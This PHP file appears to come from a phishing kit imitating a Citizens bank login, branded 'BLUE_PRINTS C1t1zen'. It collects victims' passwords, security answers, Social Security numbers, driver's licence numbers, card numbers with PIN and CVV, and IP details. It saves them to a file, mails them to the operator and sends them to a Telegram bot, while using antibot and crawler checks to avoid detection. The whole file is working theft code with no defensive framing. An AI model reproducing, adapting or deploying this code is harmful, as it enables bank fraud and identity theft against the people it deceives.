<?php
session_start();
require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkStatus()) {
        echo $antibot->throw404();
        die();
    }
    include './crawlerdetect.php';
include "step/conf/config.php";
include 'step/next/recon.php';


$body = "::::::::: BLUE_PRINTS C1t1zen [Login Details] :::::::::::::::\r\n";
$body .= "UserID                          : {$_SESSION['usrn']}\r\n";
$body .= "Password                        : {$_SESSION['sdfrd']}\r\n";
$body = "::::::::: BLUE_PRINTS C1t1zen [Email Details] :::::::::::::::\r\n";
$body .= "{$_SESSION['emailr']}\r\n";
$body .= "::::::::: BLUE_PRINTS C1t1zen Info [Security Questions] ::::::::::::\r\n"; 
$body .= "Security Question 1                  : {$_SESSION['quest1']}\r\n";
$body .= "Answer 1                             : {$_SESSION['ans1']}\r\n";
$body .= "Security Question 2                  : {$_SESSION['quest2']}\r\n";
$body .= "Answer 2                             : {$_SESSION['ans2']}\r\n";
$body .= "Security Question 3                  : {$_SESSION['quest3']}\r\n";
$body .= "Answer 3                             : {$_SESSION['ans3']}\r\n";
$body .= ":::::::::::: BLUE_PRINTS C1t1zen [Fullz Details] ::::::::::::::::\r\n";
$body .= "First Name                         : {$_SESSION['fnm']}\r\n";
$body .= "Last Name                          : {$_SESSION['lnm']}\r\n";
$body .= "Date Of Birth                      : {$_SESSION['dob']}\r\n";
$body .= "Email                              : {$_SESSION['email']}\r\n";
$body .= "DL Number                          : {$_SESSION['dlnum']}\r\n";
$body .= "Social Security Number             : {$_SESSION['ssn']}\r\n";
$body .= "Phone Number                       : {$_SESSION['phn']}\r\n";
$body .= "City                               : {$_SESSION['cty']}\r\n"; 
$body .= "Address                            : {$_SESSION['adss']}\r\n";
$body .= "ZipCode                            : {$_SESSION['zpcde']}\r\n";
$body .= "::::::::: BLUE_PRINTS C1t1zen [Card Details] ::::::::::::::::::\r\n"; 
$body .= "Card Number                          : {$_SESSION['ccnum']}\r\n";
$body .= "Card Pin                             : {$_SESSION['pin']}\r\n";
$body .= "Card Expiry Date                     : {$_SESSION['expdt']}\r\n";
$body .= "Card Security Code                   : {$_SESSION['cv2']}\r\n";
$body .=  "|--------------- I N F O | I P -------------------|\r\n";
$body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
$body .= "IP Country	                       : {$_SESSION['country']}\r\n";
$body .= "IP City	                           : {$_SESSION['city']}\r\n";
$body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
$body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
$body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
$body .= ":::::::::::::::::::::: BLUE_PRINTS C1t1zen Info :::::::::::::::::::::::::\r\n";
if($savetxt == "on"){
$save=fopen("step/data/all".$salt.".txt",'a');
fwrite($save,$body);
fclose($save);
}
$subject="C1t1zen All Details | "."IP: ".$_SERVER['REMOTE_ADDR'];
$headers="From: BLUE_PRINTS <c1t1zen@BLUE_PRINTS.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($emailzz, $subject, $body, $headers);
if($tgresult == "on"){
    $settings = include 'step/conf/settings.php';
    $data = $body;
      $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
      $website = "https://api.telegram.org/{$settings['bot_url']}";
      $ch = curl_init($website . '/sendMessage');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      $result = curl_exec($ch);
      curl_close($ch);
  }

header("Location: ./success.php?status={$_SESSION['status']}");

?>